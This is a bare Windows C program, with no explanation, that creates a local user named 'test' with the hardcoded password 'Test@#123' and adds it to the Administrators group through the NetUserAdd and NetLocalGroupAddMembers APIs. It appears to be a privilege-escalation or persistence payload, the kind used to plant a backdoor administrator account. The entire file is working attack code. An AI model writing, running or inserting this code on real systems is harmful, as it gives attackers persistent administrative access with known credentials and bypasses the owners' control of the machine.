#include <stdio.h>
#include <windows.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib")

int wmain(int argc, wchar_t *argv[])
{	
	USER_INFO_1 UserInfo  = { 0 };
	NET_API_STATUS status = NERR_Success;

	UserInfo.usri1_name     = L"test";
	UserInfo.usri1_password = L"Test@#123";
	UserInfo.usri1_priv     = USER_PRIV_USER;
	UserInfo.usri1_flags    = UF_SCRIPT;
	
	status = NetUserAdd(NULL, 1, (LPBYTE)&UserInfo, NULL);
	if (status != NERR_Success)
	{
		fprintf(stderr, "NetUserAdd(): %d\n", status);
		return 1;
	}
	
	LOCALGROUP_MEMBERS_INFO_3 account = { 0 };
	account.lgrmi3_domainandname = UserInfo.usri1_name;

	status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
	if (status != NERR_Success)
	{
		fprintf(stderr, "NetLocalGroupAddMembers(): %d\n", status);
		return 1;
	}

	return 0;
}
